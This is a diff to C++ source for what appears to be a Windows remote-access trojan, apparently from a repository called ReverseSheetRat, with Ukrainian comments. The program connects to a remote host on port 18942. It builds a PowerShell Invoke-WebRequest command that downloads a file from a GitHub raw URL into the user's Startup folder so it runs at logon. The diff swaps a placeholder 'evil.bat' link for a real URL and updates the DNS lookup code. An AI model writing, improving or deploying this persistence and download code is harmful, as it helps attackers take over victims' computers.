@@ -13,12 +13,12 @@ int main() {
     const int port = 18942;
 
     // ⚠️ Заміни на свій прямий GitHub-лінк
-    const char* githubUrl = "https://raw.githubusercontent.com/yourusername/repo/main/evil.bat";
+    const char* githubUrl = "https://github.com/arkadiychulkover/ReverseSheetRat/raw/refs/heads/master/ReverseSheetRat/Test.txt";
 
     // PowerShell команда: завантажити з GitHub у автозавантаження
     std::string psCommand =
         "powershell -c \"Invoke-WebRequest '" + std::string(githubUrl) +
-        "' -OutFile $env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\evil.bat\"\n";
+        "' -OutFile $env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\evil.txt\"\n";
 
     if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
         std::cerr << "WSAStartup failed\n";
@@ -35,15 +35,22 @@ int main() {
     server.sin_family = AF_INET;
     server.sin_port = htons(port);
 
-    // DNS resolve
-    hostent* he = gethostbyname(host);
-    if (he == nullptr) {
+    // DNS resolve using getaddrinfo
+    addrinfo hints = {};
+    hints.ai_family = AF_INET; // IPv4
+    hints.ai_socktype = SOCK_STREAM; // Stream socket
+
+    addrinfo* result = nullptr;
+    if (getaddrinfo(host, nullptr, &hints, &result) != 0) {
         std::cerr << "DNS resolution failed\n";
         closesocket(sock);
         WSACleanup();
         return 1;
     }
-    memcpy(&server.sin_addr, he->h_addr_list[0], he->h_length);
+
+    sockaddr_in* addr = reinterpret_cast<sockaddr_in*>(result->ai_addr);
+    server.sin_addr = addr->sin_addr; // Copy resolved address
+    freeaddrinfo(result);
 
     if (connect(sock, (sockaddr*)&server, sizeof(server)) < 0) {
         std::cerr << "Connection failed\n";
